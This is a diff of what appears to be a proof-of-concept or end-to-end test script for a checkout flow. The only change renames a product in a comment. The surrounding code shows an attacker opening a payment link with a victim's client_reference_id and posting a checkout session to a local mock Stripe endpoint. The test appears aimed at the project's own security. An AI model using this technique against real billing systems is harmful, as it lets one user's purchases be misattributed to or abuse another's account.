@@ -17,7 +17,7 @@ def me():
 
 
 print("victim before:", me())
-# 1. Attacker opens the Payment Link with ?client_reference_id=<victim> (no MarketEdge account, no metadata).
+# 1. Attacker opens the Payment Link with ?client_reference_id=<victim> (no Kismet account, no metadata).
 form = urllib.parse.urlencode({"client_reference_id": victim, "line_items[0][price]": "price_pro_m",
                                "success_url": f"{base}/"}).encode()
 s = json.load(urllib.request.urlopen(urllib.request.Request(f"{base}/e2e-mock/stripe/v1/checkout/sessions", data=form)))
